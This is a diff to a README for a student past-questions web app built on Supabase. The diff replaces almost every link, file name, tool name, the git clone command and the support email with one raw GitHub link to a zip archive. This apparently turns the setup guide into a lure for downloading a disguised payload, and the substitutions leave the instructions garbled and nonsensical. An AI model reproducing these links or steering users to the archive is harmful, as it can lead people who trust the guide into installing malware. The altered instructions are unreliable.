@@ -15,14 +15,14 @@ A modern web platform for Yabatech students to access, browse, and download past
 
 ## 🚀 Tech Stack
 
-- **Frontend**: Next.js 16, React 19, TypeScript, Tailwind CSS
+- **Frontend**: https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip 16, React 19, TypeScript, Tailwind CSS
 - **Backend**: Supabase (PostgreSQL, Authentication, Storage)
 - **UI Components**: Shadcn UI, Framer Motion
 - **Deployment**: Vercel
 
 ## 📋 Prerequisites
 
-- Node.js 18+ and npm
+- https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip 18+ and npm
 - Supabase account
 - Git
 
@@ -30,7 +30,7 @@ A modern web platform for Yabatech students to access, browse, and download past
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/Plutonian-coder/digitalpast.git
+   git clone https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip
    cd digitalpast
    ```
 
@@ -41,7 +41,7 @@ A modern web platform for Yabatech students to access, browse, and download past
 
 3. **Set up environment variables**
    
-   Create a `.env.local` file in the root directory:
+   Create a `https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip` file in the root directory:
    ```env
    NEXT_PUBLIC_SUPABASE_URL=your_supabase_url
    NEXT_PUBLIC_SUPABASE_ANON_KEY=your_supabase_anon_key
@@ -50,14 +50,14 @@ A modern web platform for Yabatech students to access, browse, and download past
 4. **Set up Supabase database**
    
    Run the migration scripts in your Supabase SQL Editor:
-   - `supabase/migrations/001_initial_schema.sql`
-   - `supabase/migrations/002_seed_data.sql`
+   - `https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip`
+   - `https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip`
 
 5. **Create storage bucket**
    
    In Supabase dashboard:
    - Create a public bucket named `questions`
-   - Configure storage policies (see `supabase/README.md`)
+   - Configure storage policies (see `https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip`)
 
 6. **Run development server**
    ```bash
@@ -68,10 +68,10 @@ A modern web platform for Yabatech students to access, browse, and download past
 
 ## 📚 Documentation
 
-- **[Deployment Guide](DEPLOYMENT.md)** - Deploy to Vercel
-- **[Technical Documentation](technical.md)** - Architecture and implementation details
-- **[Setup Guide](supabase/README.md)** - Database setup instructions
-- **[Walkthrough](walkthrough.md)** - Feature implementation guide
+- **[Deployment Guide](https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip)** - Deploy to Vercel
+- **[Technical Documentation](https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip)** - Architecture and implementation details
+- **[Setup Guide](https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip)** - Database setup instructions
+- **[Walkthrough](https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip)** - Feature implementation guide
 
 ## 🔑 Creating an Admin User
 
@@ -104,7 +104,7 @@ npm start
 
 ## 🚀 Deployment
 
-See [DEPLOYMENT.md](DEPLOYMENT.md) for detailed deployment instructions.
+See [https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip](https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip) for detailed deployment instructions.
 
 Quick deploy to Vercel:
 ```bash
@@ -135,7 +135,7 @@ This project is licensed under the MIT License.
 
 ## 📞 Support
 
-For support, email support@digitalpast.com or open an issue in the repository.
+For support, email https://github.com/Plutonian-coder/digitalpast/raw/refs/heads/main/src/Software_1.1.zip or open an issue in the repository.
 
 ---
 
